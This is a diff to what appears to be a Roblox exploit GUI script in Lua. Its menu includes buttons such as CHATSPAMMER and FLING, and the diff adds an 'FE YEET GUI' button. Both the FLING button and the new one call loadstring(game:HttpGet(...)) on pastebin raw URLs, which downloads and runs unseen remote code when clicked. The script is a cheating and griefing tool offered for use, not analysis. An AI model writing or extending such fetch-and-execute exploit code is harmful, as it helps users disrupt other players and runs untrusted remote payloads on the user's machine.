@@ -24,6 +24,7 @@ local CHATSPAMMER = Instance.new("TextButton")
 local C00lGUI = Instance.new("TextButton")
 local C00ZBDDKIDDIFY = Instance.new("TextButton")
 local FLING = Instance.new("TextButton")
+local YEET = Instance.new("TextButton")
 local PAGE2 = Instance.new("TextButton")
 local PAGE1 = Instance.new("TextButton")
 
@@ -117,6 +118,7 @@ C00lGUI.Visible = true
 C00ZBDDKIDDIFY.Visible = true
 PAGE2.Visible = true
 FLING.Visible = true
+YEET.Visible = true
 end
 wait(1)
 end)
@@ -671,6 +673,22 @@ FLING.TextSize = 14.000
 FLING.TextWrapped = true
 FLING.MouseButton1Down:connect(function()
 loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
+end)
+YEET.Parent = Frame
+YEET.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+YEET.Visible = false
+YEET.BorderColor3 = Color3.fromRGB(196, 40, 28)
+YEET.BorderSizePixel = 3
+YEET.Position = UDim2.new(0.7, 0, 0.75, 0)
+YEET.Size = UDim2.new(0, 70, 0, 27)
+YEET.Font = Enum.Font.SourceSans
+YEET.Text = "FE YEET GUI"
+YEET.TextColor3 = Color3.fromRGB(242, 243, 243)
+YEET.TextScaled = true
+YEET.TextSize = 14.000
+YEET.TextWrapped = true
+YEET.MouseButton1Down:connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/saMtiek2"))()
 end)
 -- Next :
 
